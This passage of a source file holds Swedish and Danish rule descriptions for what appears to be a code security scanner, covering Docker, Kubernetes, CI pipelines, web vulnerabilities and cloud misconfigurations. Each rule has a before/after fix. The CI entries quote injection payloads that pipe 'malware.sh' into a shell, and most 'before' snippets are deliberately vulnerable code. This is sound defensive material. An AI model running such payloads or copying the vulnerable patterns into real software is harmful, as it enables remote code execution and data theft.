    title: "Dockerfilen anger ingen icke-root-användare",
    description:
      "Ingen USER-instruktion i Dockerfilen: utan en körs containern som root. Om en angripare lyckas köra kod inuti containern (t.ex. genom att utnyttja ett sårbart bibliotek) gör root inuti containern en flykt till värden — eller en bredare påverkan på det omgivande systemet — enklare.",
    fix: {
      before: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]`,
      after: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nUSER node\nCMD ["node", "server.js"]`,
    },
  },
  "docker-unpinned-base-image": {
    title: 'Dockerfilens basavbildning använder taggen ":latest"',
    description:
      'En FROM-instruktion använder uttryckligen taggen ":latest" istället för en exakt version. "latest" ändras över tid: samma build, omgjord vid en annan tidpunkt, kan få en annan version av basavbildningen — en icke-reproducerbar build, och en oönskad uppdatering kan komma utan att någon har beslutat att den ska.',
    fix: {
      before: `FROM node:latest`,
      after: `FROM node:20.11-slim`,
    },
  },
  "docker-add-remote-url": {
    title: "Dockerfilen laddar ner en fjärrfil med ADD istället för COPY",
    description:
      "En ADD-instruktion med en http/https-URL laddar ner en fil från internet under builden, utan integritetskontroll och med innehållet osynligt i repot. Om den URL:en någonsin komprometteras drar builden in godtyckligt innehåll utan att någon märker det bara genom att läsa Dockerfilen.",
    fix: {
      before: `ADD https://example.com/install.sh /tmp/install.sh`,
      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<förväntad hash>  /tmp/install.sh" | sha256sum -c -`,
    },
  },
  "k8s-privileged-container": {
    title: "En container i Kubernetes-manifestet körs som privilegierad",
    description:
      '"privileged: true" i en containers securityContext inaktiverar nästan all vanlig isolering mellan container och värd: containern kan komma åt värdens enheter, ändra dess nätverkskonfiguration, och i många fall effektivt få root-åtkomst till maskinen som kör den. Nästan aldrig nödvändigt för en vanlig app.',
    fix: {
      before: `securityContext:\n  privileged: true`,
      after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # endast de capabilities som faktiskt behövs`,
    },
  },
  "k8s-plaintext-secret-env": {
    title: "En hemlighet är skriven i klartext i en miljövariabel i Kubernetes-manifestet",
    description:
      'En miljövariabel med ett namn som password/secret/token/key har ett bokstavligt värde ("value:") istället för att läsas från en Secret ("valueFrom.secretKeyRef"). Manifestet självt — ofta sparat i ett repo — innehåller därför hemligheten i klartext, synlig även för någon som bara kan läsa konfigurationen, inte nödvändigtvis köra kommandon i klustret.',
    fix: {
      before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
      after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
    },
  },
  "k8s-run-as-root": {
    title: "En container i Kubernetes-manifestet är inställd på att köras som root",
    description:
      '"runAsUser: 0" eller "runAsNonRoot: false" i securityContext tvingar uttryckligen containern att köras som root. Om en angripare lyckas köra kod inuti containern (t.ex. genom att utnyttja ett sårbart bibliotek) gör root inuti containern en flykt till värden — eller en bredare påverkan — enklare.',
    fix: {
      before: `securityContext:\n  runAsUser: 0`,
      after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
    },
  },
  "k8s-privilege-escalation": {
    title: "En container i Kubernetes-manifestet kan få fler privilegier än den startade med",
    description:
      '"allowPrivilegeEscalation: true" i securityContext låter en process inuti containern få fler privilegier än processen som startade den (t.ex. genom en setuid-binär). Kombinerat med en sårbarhet i applikationen är det ytterligare ett steg mot att köra kod med fler privilegier än avsett.',
    fix: {
      before: `securityContext:\n  allowPrivilegeEscalation: true`,
      after: `securityContext:\n  allowPrivilegeEscalation: false`,
    },
  },
  "k8s-host-namespace-access": {
    title: "En pod i Kubernetes-manifestet delar värdens nätverk, processer eller delat minne",
    description:
      '"hostNetwork", "hostPID" eller "hostIPC" satt till true tar bort poden från dess normala isolering: hostNetwork exponerar poden på värdens nätverk (och kringgår klustrets nätverkspolicyer), hostPID ger den insyn i varje process på värdmaskinen, hostIPC ger den åtkomst till värdens delade minne. Nästan aldrig nödvändigt för en vanlig app — vanligtvis bara för lågnivå-system-/övervakningsverktyg.',
    fix: {
      before: `spec:\n  hostNetwork: true`,
      after: `spec:\n  hostNetwork: false`,
    },
  },
  "k8s-missing-run-as-non-root": {
    title: "Kubernetes-manifestet tvingar inte uttryckligen körning som en icke-root-användare",
    description:
      'Inget "runAsNonRoot" någonstans i manifestet (varken på pod- eller containernivå): utan att sätta det körs en container som vilken användare dess avbildning än definierar — ofta root som standard, om avbildningen själv inte har ändrat det. Att sätta det uttryckligen till true gör att poden misslyckas med att starta om avbildningen fortfarande försöker köras som root, istället för att man bara upptäcker det efter en incident.',
    fix: {
      before: `containers:\n  - name: app\n    image: myapp:1.0`,
      after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
    },
  },
    "gitlab-ci-script-injection": {
      title: 'Ett värde som styrs av en extern användare passerar genom ett andra skal i GitLab CI-pipelinen',
      description: 'En "script:"-rad (eller "before_script:"/"after_script:") använder "eval" eller "sh -c"/"bash -c" tillsammans med en fördefinierad GitLab-variabel som titeln på en merge request, commit-meddelandet eller grennamnet — allt detta kan skrivas av vem som helst som öppnar en merge request, även från en extern fork. Värdet expanderas först av det yttre skalet och klistras sedan in i en sträng som det andra skalet tolkar igen som kod: en titel som "$(curl malware.sh | sh)" skulle köra godtyckliga kommandon i pipelinen, med tillgång till alla hemligheter som är tillgängliga i det jobbet.',
      fix: {
        before: `script:
  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
        after: `script:
  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # skickas som argument till kommandot, aldrig inuti en "bash -c"-sträng som skulle tolka om det`,
      },
    },
    "gitlab-ci-privileged-dind-no-tls": {
      title: 'Docker-in-Docker i GitLab CI-pipelinen körs med TLS-kryptering avstängd',
      description: 'Jobbet använder tjänsten "docker:dind" (Docker-in-Docker, behövs för att bygga images inuti pipelinen) men sätter "DOCKER_TLS_CERTDIR" till en tom sträng, vilket stänger av TLS-krypteringen mellan Docker-klienten och dind-demonen helt. Utan TLS kan vem som helst som når den porten på samma interna nätverk som runnern ta kontroll över Docker-demonen — som körs med utökade rättigheter — istället för att vara begränsad till jobbet som ska använda den.',
      fix: {
        before: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: ""`,
        after: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: "/certs"  # TLS förblir aktiverat mellan Docker-klienten och dind-demonen — "" stänger av det helt`,
      },
    },
    "gitlab-ci-unpinned-image": {
      title: 'Docker-avbildningen i GitLab CI-pipelinen är inte låst till en specifik version',
      description: 'Ett "image:" i pipelinen pekar på en avbildning utan tagg (motsvarar ":latest") eller uttryckligen på ":latest". Den som underhåller avbildningen kan byta ut innehållet när som helst utan att repot ändras — samma pipeline kan plötsligt börja köra annan kod, en supply chain-risk som konceptuellt är identisk med en GitHub Action som refereras via tagg istället för commit.',
      fix: {
        before: `image: node:latest`,
        after: `image: node:20.11.1  # en specifik tagg (eller ännu hellre ett digest "node@sha256:...") istället för "latest"`,
      },
    },
},
  da: {
  "supabase-service-role-in-client": {
    title: "Supabases hemmelige nøgle havner i en fil, der er synlig for browseren",
    description:
      "En variabel med et offentligt præfiks (f.eks. NEXT_PUBLIC_, VITE_) eller en klientside-fil refererer til Supabases service role key. Denne nøgle omgår Row Level Security: hvis den havner i browser-bundlet, kan alle læse den og agere som databaseadministrator.",
    fix: {
      before: `// components/Dashboard.tsx\nconst supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
      after: `// app/api/admin/route.ts (kun server)\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
    },
  },
  "hardcoded-secret": {
    title: "Adgangskoder eller hemmelige nøgler er skrevet direkte i koden",
    description:
      "En API-nøgle, et token eller en adgangskode ser ud til at være skrevet som en bogstavelig værdi i stedet for at blive læst fra en miljøvariabel. Alle, der læser kildekoden (eller repositoriet, hvis det er offentligt), får fat i den hemmelighed.",
    fix: {
      before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
      after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
    },
  },
  "env-file-with-real-values": {
    title: "En fil med projektets rigtige adgangskoder er blandt dem, der analyseres",
    description:
      "En .env-fil med rigtige værdier (ikke en .env.example) er inkluderet i analysen. Hvis denne fil havner i et repository eller en offentlig deployment, bliver alle legitimationsoplysninger i den eksponeret.",
    fix: {
      before: `# .env (committet ved en fejl)\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
      after: `# .env.example (committet)\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# .env forbliver uden for repoet (.gitignore)`,
    },
  },
  "missing-row-level-security": {
    title: "Alle kan læse eller ændre alle brugeres data",
    description:
      "Row Level Security er deaktiveret, eller en policy tillader adgang for alle (USING (true)) uden at kontrollere, hvem der laver forespørgslen. Enhver godkendt bruger — eller endda en anonym — kan læse eller ændre alle andres data.",
    fix: {
      before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
      after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "owners only" ON public.orders\n  USING (auth.uid() = user_id);`,
    },
  },
  "sql-injection": {
    title: "En værdi indtastet af brugeren indsættes direkte i en databaseforespørgsel",
    description:
      "En SQL-forespørgsel bygges ved at sammenkæde eller interpolere en streng direkte i stedet for at bruge parametre. Hvis denne tekst kommer (selv indirekte) fra en bruger, kan det ændre selve forespørgslen — SQL injection.",
    fix: {
      before: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
      after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
    },
  },
  "plaintext-password-storage": {
    title: "Adgangskoder ser ikke ud til at være beskyttet",
    description:
      "Et adgangskodefelt gemmes præcis, som det ankom i anmodningen, og der optræder ingen hashing-funktion (bcrypt, argon2, scrypt) i filen. Hvis databasen bliver kompromitteret, kan alle adgangskoder bruges med det samme.",
    fix: {
      before: `await db.users.insert({ email, password: req.body.password })`,
      after: `const hashed = await bcrypt.hash(req.body.password, 12)\nawait db.users.insert({ email, password: hashed })`,
    },
  },
  "hardcoded-jwt-secret": {
    title: "Den hemmelighed, der bruges til at signere logins, er skrevet i klartekst i koden",
    description:
      "Hemmeligheden, der sendes til jwt.sign / jwt.verify (eller JWT_SECRET-variablen), er en bogstavelig værdi i koden i stedet for at komme fra en miljøvariabel. Alle, der læser den, kan oprette gyldige adgangstokens for enhver bruger.",
    fix: {
      before: `jwt.sign(payload, "super-secret-key-123")`,
      after: `jwt.sign(payload, process.env.JWT_SECRET)`,
    },
  },
  "command-injection": {
    title: "Serveren kan tvinges til at køre eksterne kommandoer",
    description:
      "En funktion, der kører systemkommandoer (exec, execSync, spawn), modtager en streng bygget ved interpolation eller sammenkædning. Hvis en del af den streng kommer fra brugerinput, kan den, der kontrollerer den, få vilkårlige kommandoer til at køre på serveren.",
    fix: {
      before: "execSync(`convert ${filename} output.png`)",
      after: `execFile("convert", [filename, "output.png"])`,
    },
  },
  "unprotected-new-table": {
    title: "En ny tabel ser ud til at være oprettet uden beskyttelse",
    description:
      "En SQL-migrering opretter en tabel, men aktiverer ikke Row Level Security for den samme tabel i den samme fil. Så længe det forbliver sådan, starter tabellen uden nogen begrænsning på, hvem der kan læse eller skrive til den.",
    fix: {
      before: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);`,
      after: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);\nALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
    },
  },
  "permissive-cors": {
    title: "Sitet accepterer anmodninger fra alle andre websites",
    description:
      "CORS-headeren er sat til at acceptere anmodninger fra enhver oprindelse (*), eller cors()-middlewaren bruges uden begrænsninger. Ethvert tredjepartswebsite kan kalde dine API'er fra browseren hos en allerede godkendt bruger.",
    fix: {
      before: `app.use(cors())`,
      after: `app.use(cors({ origin: ["https://dinside.dk"] }))`,
    },
  },
  "admin-function-missing-auth": {
    title: "En funktion med administratorrettigheder kontrollerer ikke, hvem der bruger den",
    description:
      "En rute eller funktion, hvis navn antyder administratoroperationer, indeholder ikke, i de nærliggende linjer, noget tjek af godkendelse eller rolle. Alle, der kender URL'en, kunne køre den.",
    fix: {
      before: `router.post("/admin/delete-user", async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
      after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
    },
  },
  ssrf: {
    title: "Sitet kan tvinges til at køre ekstern kode",
    description:
      "En udgående HTTP-anmodning (fetch, axios) bruger direkte en værdi, der kommer fra en brugers anmodning, som destinations-URL. En ondsindet bruger kan få din server til at kalde interne eller vilkårlige adresser — Server-Side Request Forgery.",
    fix: {
      before: `const data = await fetch(req.query.url)`,
      after: `const ALLOWED = new Set(["https://api.dintjeneste.dk"])\nif (!ALLOWED.has(req.query.url)) throw new Error("URL ikke tilladt")\nconst data = await fetch(req.query.url)`,
    },
  },
  "weak-password-hashing": {
    title: "Adgangskoder er beskyttet med en metode, der nu er let at bryde",
    description:
      "På samme linje anvendes md5() eller sha1() på en værdi knyttet til en adgangskode. Disse algoritmer er for hurtige at beregne: en angriber med databasen kan prøve milliarder af adgangskoder i sekundet.",
    fix: {
      before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
      after: `const hashed = await bcrypt.hash(password, 12)`,
    },
  },
  "xss-dangerous-html": {
    title: "Tekst skrevet af brugere kunne køre kode i browseren",
    description:
      "Indhold indsættes på siden som rå HTML (dangerouslySetInnerHTML, v-html, .innerHTML) i stedet for som almindelig tekst. Hvis det indhold inkluderer brugerinput, kan det indeholde scripts, der køres i browseren hos den, der læser siden.",
    fix: {
      before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
      after: `<div>{comment.text}</div>\n// eller, hvis HTML er nødvendigt: DOMPurify.sanitize(comment.text)`,
    },
  },
  "public-storage-bucket": {
    title: "Pladsen til uploadede filer er synlig for alle",
    description:
      "En storage-bucket (Supabase Storage, S3) er konfigureret som offentlig. Hvis den indeholder dokumenter, billeder eller filer uploadet af brugere, kan alle, der kender — eller gætter — stien, tilgå dem uden godkendelse.",
    fix: {
      before: `supabase.storage.createBucket("uploads", { public: true })`,
      after: `supabase.storage.createBucket("uploads", { public: false })\n// server filer med tidsbegrænsede signerede URL'er: createSignedUrl(path, 60)`,
    },
  },
  "csrf-state-changing-get": {
    title: "Ét link er nok til at slette eller ændre data",
    description:
      "En GET-rute udfører en handling, der ændrer data (stien indeholder delete/remove/update/edit). GET-anmodninger køres bare ved at besøge et link eller indlæse et billede fra et eksternt site — det klassiske springbræt for et CSRF-angreb.",
    fix: {
      before: `router.get("/posts/:id/delete", deletePost)`,
      after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
    },
  },
  "insecure-token-storage": {
    title: "Logindata gemt i browseren er ikke godt beskyttet",
    description:
      "Et adgangstoken gemmes i localStorage. I modsætning til en httpOnly-cookie kan ethvert script, der kører på siden (inklusive et ondsindet script indsat via XSS), læse og stjæle det.",
    fix: {
      before: `localStorage.setItem("authToken", token)`,
      after: `// sæt tokenet som en httpOnly-cookie fra serveren:\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "open-redirect": {
    title: "Sitet kan bruges til at omdirigere til et svindelwebsite",
    description:
      "Sitet omdirigerer brugeren til en adresse taget direkte fra anmodningen (query, body, params) uden at kontrollere, at det er et kendt domæne. Et link, der ser ud til at pege på dit site, kan i virkeligheden føre til en phishing-side.",
    fix: {
      before: `res.redirect(req.query.next)`,
      after: `const ALLOWED = new Set(["/dashboard", "/profile"])\nres.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
    },
  },
  idor: {
    title: "At ændre et tal i adressen kunne vise andres data",
    description:
      "En databaseforespørgsel bruger direkte et id taget fra URL'en (req.params.id) uden at kontrollere, i de nærliggende linjer, at det tilhører den bruger, der laver anmodningen. At ændre id'et i adressen kunne give adgang til en anden brugers data — Insecure Direct Object Reference.",
    fix: {
      before: `const order = await Order.findById(req.params.id)`,
      after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
    },
  },
  "no-login-rate-limit": {
    title: "Loginformularen blokerer ikke for mange forsøg i træk",
    description:
      "En login-rute er defineret i filen, men der er ingen spor af rate-limiting-middleware i samme fil. Uden en grænse for forsøg kan en angriber prøve adgangskoder i rækkefølge (brute force) uden at blive bremset.",
    fix: {
      before: `router.post("/login", loginHandler)`,
      after: `import rateLimit from "express-rate-limit"\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })\nrouter.post("/login", loginLimiter, loginHandler)`,
    },
  },
  "sensitive-data-in-logs": {
    title: "Adgangskoder eller følsomme data havner i logs",
    description:
      "Et kald til console.log (eller lignende) inkluderer en variabel kaldet password, token, secret eller apiKey. Hvis disse logs havner i en ekstern tjeneste eller en fil, forbliver følsomme data eksponeret meget længere end nødvendigt.",
    fix: {
      before: `console.log("login attempt", { email, password })`,
      after: `console.log("login attempt", { email })`,
    },
  },
  "path-traversal": {
    title: "En fil på serveren kan læses eller skrives ved at vælge stien udefra",
    description:
      "En funktion, der læser, skriver eller sender en fil, henter stien direkte fra en værdi i anmodningen (query, body, params) uden at kontrollere, at den forbliver inden for en tilladt mappe. En angriber kan indsætte \"../\" for at komme ud af den tiltænkte mappe og læse eller overskrive vilkårlige filer på serveren (f.eks. en konfigurationsfil med legitimationsoplysninger).",
    fix: {
      before: `app.get("/download", (req, res) => {\n  res.sendFile(req.query.file)\n})`,
      after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("Sti ikke tilladt")\n  res.sendFile(target)\n})`,
    },
  },
  "nosql-injection": {
    title: "En værdi indtastet af brugeren eksekveres som kode inde i en MongoDB-forespørgsel",
    description:
      "MongoDBs $where-operator kører JavaScript på serversiden for hvert dokument — hvis den streng bygges ved at sammenkæde en værdi, der kommer fra brugeren, kan den, der kontrollerer den, få vilkårlig kode til at køre i databasens kontekst, ikke bare ændre filteret som ved en almindelig SQL injection.",
    fix: {
      before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
      after: `db.collection.find({ username: username })`,
    },
  },
  ssti: {
    title: "En værdi indtastet af brugeren fortolkes som en skabelon, ikke som data",
    description:
      "En funktion, der kompilerer/udfører en skabelon, modtager HELE skabelonen fra en værdi i anmodningen, i stedet for at bruge en fast skabelon og kun sende data med. En angriber kan skrive direkte i skabelonmotorens syntaks (f.eks. {{7*7}} for Jinja2) og køre kode på serveren — Server-Side Template Injection, som ofte fører til eksekvering af vilkårlige kommandoer, ikke bare et visningsproblem som XSS.",
    fix: {
      before: `return render_template_string(request.args.get("name"))`,
      after: `return render_template("profile.html", name=request.args.get("name"))`,
    },
  },
  xxe: {
    title: "XML-parseren kan tvinges til at læse filer eller lave eksterne forespørgsler",
    description:
      "En XML-parser (DocumentBuilderFactory) oprettes uden eksplicit at deaktivere eksterne entiteter (DOCTYPE) i de nærliggende linjer. Hvis parseren modtager XML fra en kilde, der ikke er tillid til, kan en angriber definere en ekstern entitet til at læse filer på serveren eller få den til at kontakte en adresse efter eget valg — XML External Entity.",
    fix: {
      before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();`,
      after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nDocumentBuilder builder = factory.newDocumentBuilder();`,
    },
  },
  "terraform-open-security-group": {
    title: "En Terraform security group åbner en følsom port mod hele internettet",
    description:
      "En regel med \"cidr_blocks\", der inkluderer 0.0.0.0/0 (enhver IP-adresse), er tæt på en følsom port — SSH (22), RDP (3389) eller en typisk databaseport (MySQL, Postgres, MongoDB, Redis, SQL Server). Alle på internettet kan forsøge at oprette forbindelse til den tjeneste, ikke kun dem, der burde.",
    fix: {
      before: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["0.0.0.0/0"]\n}`,
      after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # kun dit private netværk, eller en bastion host\n}`,
    },
  },
  "gcp-firewall-open-to-internet": {
    title: "En Google Cloud firewall-regel åbner en følsom port mod hele internettet",
    description:
      "En \"google_compute_firewall\"-ressource med \"source_ranges\", der inkluderer 0.0.0.0/0 (enhver IP-adresse), tillader trafik til en følsom port — SSH (22), RDP (3389) eller en typisk databaseport (MySQL, Postgres, MongoDB, Redis, SQL Server). Alle på internettet kan forsøge at oprette forbindelse til den tjeneste, ikke kun dem, der burde.",
    fix: {
      before: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["0.0.0.0/0"]\n}`,
      after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # kun dit private netværk, eller en bastion host\n}`,
    },
  },
  "azure-nsg-open-to-internet": {
    title: "En Azure-netværksregel åbner en følsom port mod hele internettet",
    description:
      "En netværkssikkerhedsregel (\"azurerm_network_security_rule\", eller en \"security_rule\"-blok inde i \"azurerm_network_security_group\") med \"source_address_prefix\" sat til \"*\" eller \"0.0.0.0/0\", retning \"Inbound\" og adgang \"Allow\", tæt på en følsom port — SSH (22), RDP (3389) eller en typisk databaseport. Alle på internettet kan forsøge at oprette forbindelse til den tjeneste, ikke kun dem, der burde.",
    fix: {
      before: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "*"\n}`,
      after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # kun dit private netværk, eller en bastion host\n}`,
    },
  },
  "terraform-hardcoded-secret": {
    title: "En hemmelighed er skrevet som standardværdi for en Terraform-variabel",
    description:
      "En variabel med et navn som password/secret/token/key har en bogstavelig værdi i sin \"default\". I modsætning til en værdi, der sendes ved runtime (tfvars, TF_VAR_*-miljøvariabler), havner en default i kildekoden — og hvis repositoriet er delt eller offentligt, kan alle se den, selv uden adgang til Terraform-tilstanden.",
    fix: {
      before: `variable "db_password" {\n  default = "supersecret123"\n}`,
      after: `variable "db_password" {\n  # ingen default: send den med en .tfvars-fil (uden for git) eller en TF_VAR_db_password-miljøvariabel\n  sensitive = true\n}`,
    },
  },
  "gha-script-injection": {
    title: "En værdi kontrolleret af en ekstern bruger går direkte ind i en CI-shellkommando",
    description:
      'En "run:"-kommando i en GitHub Actions-workflow interpolerer direkte en værdi som en pull request-titel, et branch-navn eller teksten i en kommentar — alle sammen skrivbare af alle, der åbner en pull request eller kommentar, selv fra en ekstern fork. En værdi som `"; curl malware.sh | sh #` ville køre vilkårlige kommandoer i CI\'en, med adgang til alle hemmeligheder, der er tilgængelige i den workflow.',
    fix: {
      before: `- run: echo "\${{ github.event.pull_request.title }}"`,
      after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # sendt som en miljøvariabel, aldrig interpoleret direkte i kommandoen`,
    },
  },
  "gha-pull-request-target-checkout": {
    title: "Workflowet kører koden fra en ekstern pull request med adgang til repositoriets hemmeligheder",
    description:
      'Workflowet bruger "pull_request_target" — som kører med basisrepositoriets tilladelser og hemmeligheder, selv for en pull request åbnet fra en ikke-relateret fork — og tjekker koden fra selve pull requesten ud ("github.event.pull_request.head"), ikke basisbranchen. Den, der åbner pull requesten, får reelt sin egen kode til at køre med adgang til de hemmeligheder.',
    fix: {
      before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}`,
      after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # Tjekker basisbranchen ud, ikke PR'ens kode — eller brug\n      # "pull_request" i stedet for "pull_request_target", hvis du ikke har brug for\n      # de bredere tilladelser/hemmeligheder.\n      - uses: actions/checkout@v4`,
    },
  },
  "insecure-deserialization": {
    title: "Data fra anmodningen deserialiseres med et format, der kan eksekvere kode",
    description:
      "pickle (Python), unserialize() (PHP), ObjectInputStream (Java) eller node-serialize-biblioteket (Node) deserialiserer en værdi taget direkte fra anmodningen. I modsætning til JSON kan disse formater repræsentere og eksekvere kode under selve deserialiseringen — den, der kontrollerer den værdi, der sendes, kan opnå vilkårlig kodeeksekvering på serveren.",
    fix: {
      before: `data = pickle.loads(request.data)`,
      after: `import json\ndata = json.loads(request.data)  # JSON eksekverer aldrig kode under parsing, i modsætning til pickle`,
    },
  },
  "jwt-none-algorithm": {
    title: 'Koden accepterer eksplicit usignerede JWT-tokens ("none"-algoritmen)',
    description:
      '"none" optræder blandt de algoritmer, der accepteres til at verificere et JWT-token. Et token med "none"-algoritmen har ingen signatur at verificere: alle kan bygge et med et hvilket som helst indhold (f.eks. en administratorrolle), og koden ville acceptere det som gyldigt.',
    fix: {
      before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // inkludér aldrig "none" blandt de accepterede algoritmer`,
    },
  },
  "terraform-s3-block-public-access-disabled": {
    title: "Block Public Access er deaktiveret på en S3-bucket defineret i Terraform",
    description:
      'En eller flere af de fire beskyttelser i "aws_s3_bucket_public_access_block" (block_public_acls, ignore_public_acls, block_public_policy, restrict_public_buckets) er sat til false. Det betyder ikke, at bucketten allerede er offentlig, men det fjerner et sikkerhedsnet, der ville forhindre, at den bliver gjort offentlig ved en fejl i fremtiden.',
    fix: {
      before: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls = false\n}`,
      after: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls       = true\n  ignore_public_acls      = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n}`,
    },
  },
  "terraform-iam-wildcard-policy": {
    title: "En IAM-policy defineret i Terraform giver fuld adgang",
    description:
      'Et statement med handling "*" og ressource "*" giver fuld adgang til hver AWS-tjeneste og -ressource — samme kontrol, der allerede udføres på den live IAM-tilstand, her læst direkte fra koden, før den overhovedet er anvendt. Det kan være tiltænkt en nødrolle, men det bør bekræftes: til daglig brug skal du kun give de tilladelser, der rent faktisk er nødvendige.',
    fix: {
      before: `statement {\n  effect    = "Allow"\n  actions   = ["*"]\n  resources = ["*"]\n}`,
      after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::din-bucket/*"]\n}`,
    },
  },
  "gcp-storage-bucket-public": {
    title: "En Google Cloud Storage-bucket gøres læsbar for alle",
    description:
      'En "google_storage_bucket_iam_member"- eller "google_storage_bucket_iam_binding"-ressource giver en rolle til "allUsers" eller "allAuthenticatedUsers" — den første gør bucketten læsbar for alle på internettet, selv uden en Google-konto; den anden for alle med en hvilken som helst Google-konto, ikke kun dem, der burde have adgang.',
    fix: {
      before: `resource "google_storage_bucket_iam_member" "public" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}`,
      after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:someone@example.com"  # kun dem, der rent faktisk skal have adgang, ikke allUsers/allAuthenticatedUsers\n}`,
    },
  },
  "azure-storage-public-access": {
    title: "Offentlig blob-adgang er aktiveret på en Azure storage-konto",
    description:
      '"allow_blob_public_access" er sat til true på en "azurerm_storage_account": alle, der kender URL\'en til en blob/container gjort offentlig, kan læse den, uden nogen godkendelse.',
    fix: {
      before: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = true\n}`,
      after: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = false\n}`,
    },
  },
  "gcp-iam-overly-broad-role": {
    title: "En Google Cloud IAM-rolle giver fuld adgang (Owner/Editor)",
    description:
      'En "google_project_iam_binding"/"google_project_iam_member" (eller det tilsvarende på organisations-/mappeniveau) tildeler den primitive rolle "roles/owner" eller "roles/editor" — næsten fuld adgang til hver tjeneste i projektet. Det kan være tiltænkt en nødkonto, men det bør bekræftes: til daglig brug skal du kun give de mere specifikke foruddefinerede roller, der rent faktisk er nødvendige.',
    fix: {
      before: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/owner"\n  member  = "user:dev@example.com"\n}`,
      after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # kun den foruddefinerede rolle, der rent faktisk er nødvendig, ikke roles/owner\n  member  = "user:dev@example.com"\n}`,
    },
  },
  "azure-role-assignment-owner": {
    title: "En Azure-roletildeling giver fuld adgang (Owner)",
    description:
      'En "azurerm_role_assignment" tildeler rollen "Owner" — fuld adgang, inklusive kontrol over andre brugeres tilladelser, over hele det tildelte scope (abonnement, ressourcegruppe...). Det kan være tiltænkt en nødkonto, men det bør bekræftes: til daglig brug skal du kun give den mere specifikke rolle, der rent faktisk er nødvendig (f.eks. "Contributor" på en enkelt ressourcegruppe).',
    fix: {
